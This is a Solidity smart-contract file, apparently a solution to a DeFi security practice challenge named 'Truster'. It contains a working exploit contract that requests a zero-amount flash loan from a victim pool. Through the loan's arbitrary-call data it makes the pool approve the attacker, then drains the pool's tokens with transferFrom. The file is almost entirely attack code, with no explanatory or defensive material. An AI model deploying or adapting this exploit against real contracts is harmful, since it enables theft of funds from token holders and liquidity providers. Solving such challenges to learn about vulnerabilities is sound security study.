// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface TrusterPoolInterface {
        function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract ExploitTruster {
    address public owner;
    TrusterPoolInterface pool;
    IERC20 public immutable tokenContract;

    constructor(address _victimPoolAddress, address _tokenAddress) {
        pool = TrusterPoolInterface(_victimPoolAddress);
        tokenContract = IERC20(_tokenAddress);
    }

    function exploit(uint256 amount) public {
        // There should be no space in encodeWithSignature!
        pool.flashLoan(0, address(this), address(tokenContract), abi.encodeWithSignature("approve(address,uint256)", address(this), amount));
        tokenContract.transferFrom(address(pool), msg.sender, amount);
    }

    function tst(address hello) public {}
}